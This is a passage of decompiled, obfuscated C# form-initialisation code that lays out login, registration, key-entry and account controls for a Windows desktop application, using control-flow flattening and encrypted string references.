            num1 = (int) num3 * -318552926 ^ 403242000;
            continue;
          case 320:
            ((Ports) this).loadingimageR.Style = UIStyle.Custom;
            ((Ports) this).loadingimageR.StyleCustomMode = true;
            ((Ports) this).loadingimageR.TabIndex = 70;
            num1 = (int) num3 * -1047013443 ^ -157223611;
            continue;
          case 321:
            ((Ports) this).loginbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * -585911039 ^ 1581961299;
            continue;
          case 322:
            ((Ports) this).CHIDaccount.Font = new Font(EXGuarder.\u0031935320A, 12f);
            ((Ports) this).CHIDaccount.ForeColor = Color.White;
            ((Ports) this).CHIDaccount.Location = new Point(4, 60);
            num1 = (int) num3 * -1284157238 ^ -1068704989;
            continue;
          case 323:
            ((Ports) this).PictureBox1.Margin = new Padding(2);
            num1 = (int) num3 * -759208930 ^ -2105404738;
            continue;
          case 324:
            ((Ports) this).loginlabel.ForeColor = Color.White;
            ((Ports) this).loginlabel.Location = new Point(0, 0);
            ((Ports) this).loginlabel.Margin = new Padding(2, 0, 2, 0);
            ((Ports) this).loginlabel.Name = EXGuarder.\u00377265675;
            ((Ports) this).loginlabel.Size = new Size(309, 56);
            num1 = (int) num3 * -1811921437 ^ 1386761770;
            continue;
          case 325:
            ((Ports) this).loadingimage = new DrakeUILoadingBar();
            num1 = (int) num3 * -376113049 ^ 1323639593;
            continue;
          case 326:
            ((Ports) this).regbtn.RectPressColor = Color.White;
            num1 = (int) num3 * 422673874 ^ 752924207;
            continue;
          case 327:
            ((Ports) this).DrakeUILinkLabel1.Name = EXGuarder.\u003193B4044;
            num1 = (int) num3 * 1520471833 ^ 374642699;
            continue;
          case 328:
            ((Ports) this).exitbtn.BackColor = Color.Transparent;
            num1 = (int) num3 * 1771616924 ^ 828051878;
            continue;
          case 329:
            ((Ports) this).Label1.TabIndex = 63;
            num1 = (int) num3 * -571568520 ^ -678771124;
            continue;
          case 330:
            ((Ports) this).regbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 1935952920 ^ 212351285;
            continue;
          case 331:
            ((Ports) this).CHIDaccount.TabIndex = 71;
            num1 = (int) num3 * 1290429648 ^ 774160295;
            continue;
          case 332:
            ((Ports) this).usrkeytext.Margin = new Padding(4);
            num1 = (int) num3 * -315213449 ^ -598994479;
            continue;
          case 333:
            ((Ports) this).usremailtextreg.TabIndex = 64;
            ((Ports) this).usremailtextreg.TextAlignment = ContentAlignment.TopCenter;
            ((Ports) this).usremailtextreg.Watermark = EXGuarder.\u00338192E1D;
            num1 = (int) num3 * 383182049 ^ 2068662724;
            continue;
          case 334:
            ((Ports) this).usremailtext = new DrakeUITextBox();
            num1 = (int) num3 * 1957026350 ^ -102584493;
            continue;
          case 335:
            ((Ports) this).exitbtn.RectSelectedColor = Color.White;
            ((Ports) this).exitbtn.Size = new Size(28, 24);
            ((Ports) this).exitbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 602993344 ^ 1756398551;
            continue;
          case 336:
            ((Ports) this).statuslabel.BackColor = Color.Black;
            ((Ports) this).statuslabel.Dock = DockStyle.Bottom;
            ((Ports) this).statuslabel.Enabled = false;
            num1 = (int) num3 * 1716279346 ^ 367141679;
            continue;
          case 337:
            ((Ports) this).PictureBox1.Name = EXGuarder.\u00366055F1A;
            num1 = (int) num3 * 1023340242 ^ 818960892;
            continue;
          case 338:
            ((Ports) this).DrakeUILoadingBar1.Visible = false;
            num1 = (int) num3 * 1549683946 ^ 38919789;
            continue;
          case 339:
            ((ISupportInitialize) ((Ports) this).PictureBox1).EndInit();
            num1 = (int) num3 * -1249567953 ^ -240740513;
            continue;
          case 340:
            ((Ports) this).usremailtext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * -1651721075 ^ 1815264292;
            continue;
          case 341:
            ((Ports) this).DrakeUITabControl1.ResumeLayout(false);
            num1 = (int) num3 * -1142449183 ^ -1050135972;
            continue;
          case 342:
            ((Ports) this).pnl1.Controls.Add((Control) ((Ports) this).statuslabel);
            num1 = (int) num3 * -905356132 ^ 844211591;
            continue;
          case 343:
            ((Ports) this).TabPage1.Location = new Point(0, 40);
            num1 = (int) num3 * 2117790555 ^ -1635272120;
            continue;
          case 344:
            ((Ports) this).CHIDaccount.TextAlignment = ContentAlignment.TopCenter;
            ((Ports) this).CHIDaccount.Watermark = EXGuarder.\u00338192E1D;
            num1 = (int) num3 * 611547038 ^ 1568208525;
            continue;
          case 345:
            ((Ports) this).CHIDimg.Visible = false;
            ((Ports) this).CHIDbtn.BackColor = Color.Transparent;
            ((Ports) this).CHIDbtn.Cursor = Cursors.Hand;
            ((Ports) this).CHIDbtn.Enabled = false;
            num1 = (int) num3 * -823573521 ^ 245784793;
            continue;
          case 346:
            ((Ports) this).TabPage3.Controls.Add((Control) ((Ports) this).CHIDimg);
            num1 = (int) num3 * 1613102080 ^ -1869513208;
            continue;
          case 347:
            ((Ports) this).pnl0.Name = EXGuarder.\u003652E4150;
            ((Ports) this).pnl0.Size = new Size(991, 484);
            ((Ports) this).pnl0.TabIndex = 0;
            num1 = (int) num3 * 469593477 ^ 142491085;
            continue;
          case 348:
            ((Ports) this).regbtn.Text = EXGuarder.\u003622B386F;
            num1 = (int) num3 * -2030023569 ^ -1967733449;
            continue;
          case 349:
            ((Ports) this).Panel1.Controls.Add((Control) ((Ports) this).policylink);
            num1 = (int) num3 * 1106987479 ^ 42745853;
            continue;
          case 350:
            ((Ports) this).keyText.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * 987598720 ^ 2140513699;
            continue;
          case 351:
            ((Ports) this).PictureBox1.Size = new Size(671, 476);
            ((Ports) this).PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            ((Ports) this).PictureBox1.TabIndex = 51;
            num1 = (int) num3 * -1546508639 ^ -883386202;
            continue;
          case 352:
            ((Ports) this).loadingimageR.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1524268269 ^ 1817511788;
            continue;
          case 353:
            ((Ports) this).regbtn.Location = new Point(98, 167);
            ((Ports) this).regbtn.Name = EXGuarder.\u0032C21644A;
            ((Ports) this).regbtn.Radius = 10;
            num1 = (int) num3 * 1417517887 ^ -820340663;
            continue;
          case 354:
            ((Ports) this).usremailtextreg.Minimum = (double) int.MinValue;
            ((Ports) this).usremailtextreg.Name = EXGuarder.\u0032810586F;
            ((Ports) this).usremailtextreg.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * 903636816 ^ 882715534;
            continue;
          case 355:
            ((Ports) this).CHIDpassword.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * -266574606 ^ 1402922778;
            continue;
          default:
            goto label_358;
        }
      }
label_3:
      return;
label_358:;
    }
  }
}
